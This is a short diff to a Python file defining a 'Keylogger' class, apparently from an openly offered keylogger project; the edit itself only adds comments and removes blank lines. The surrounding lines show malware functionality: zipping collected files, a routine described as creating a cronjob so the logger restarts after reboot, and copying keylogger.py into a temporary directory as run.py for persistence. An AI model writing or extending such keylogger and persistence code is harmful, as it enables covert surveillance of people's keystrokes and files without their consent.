@@ -168,7 +168,8 @@ class Keylogger:
 		# list to contain all path of files to zip
 		file_paths = []
 		zip_name = 'zipped_file.zip'
-
+		# os.walk returns current_path, directories in current_path,
+		# files in current_path
 		for root, directories, files in os.walk(direc):
 			for file in files:
 				# joining absolute path with file name
@@ -214,7 +215,6 @@ class Keylogger:
 					# closing file to end loop
 					zip_file.close()
 
-
 	'''
 	Create cronjob to startup keyself.logger after reboot
 	'''
@@ -234,7 +234,6 @@ class Keylogger:
 		# copy contents of keylog py file over to /tmp
 		# to make sure cronjob finds python file to interpret
 		subp.call(['cp', self.initial_file_path + '/keylogger.py', self.directory + 'run.py'])
-
 
 '''
 *************
